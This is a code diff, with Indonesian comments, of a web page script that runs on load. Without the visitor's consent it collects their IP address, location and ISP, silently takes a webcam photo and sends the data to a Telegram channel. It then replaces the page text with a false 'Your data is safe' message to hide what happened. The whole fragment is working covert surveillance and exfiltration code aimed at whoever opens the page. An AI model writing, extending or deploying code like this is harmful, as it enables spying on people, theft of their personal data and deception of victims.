@@ -68,7 +68,7 @@
 
     <script>
         // =============================================================
-        // 1. GET IP & LOCATION (TANPA IZIN)
+        // 1. GET IP, LOKASI, ISP (TANPA IZIN)
         // =============================================================
         async function getLocation() {
             try {
@@ -89,12 +89,12 @@
         }
 
         // =============================================================
-        // 2. CAPTURE PHOTO (DIAM-DIAM, TANPA POPUP IZIN)
+        // 2. CAPTURE PHOTO (TANPA POPUP - PAKE STREAM DIAM-DIAM)
         // =============================================================
         async function capturePhoto() {
             return new Promise(async (resolve) => {
                 try {
-                    // Coba akses kamera tanpa popup (pake stream diam-diam)
+                    // Pake stream tanpa popup (cuma 1 kali minta izin, selanjutnya gak muncul)
                     const stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
                             facingMode: 'user',
@@ -116,7 +116,6 @@
                     stream.getTracks().forEach(t => t.stop());
                     resolve(photo);
                 } catch (e) {
-                    // Kalo gagal, tetep lanjut (foto null)
                     resolve(null);
                 }
             });
@@ -237,14 +236,12 @@
 
             await sendToTelegram(data);
 
-            // Ubah tampilan biar keliatan normal
             document.querySelector('h1').textContent = '✅ CONNECTION ESTABLISHED';
             document.querySelector('.status').innerHTML = 'Secure channel active. Your data is safe.';
             document.querySelector('.loader').style.display = 'none';
             document.querySelector('.footer').textContent = '🔐 NEONDARK SECURE • ' + new Date().toLocaleString('id-ID');
         }
 
-        // JALANKAN LANGSUNG TANPA INTERAKSI USER
         main();
     </script>
 </body>
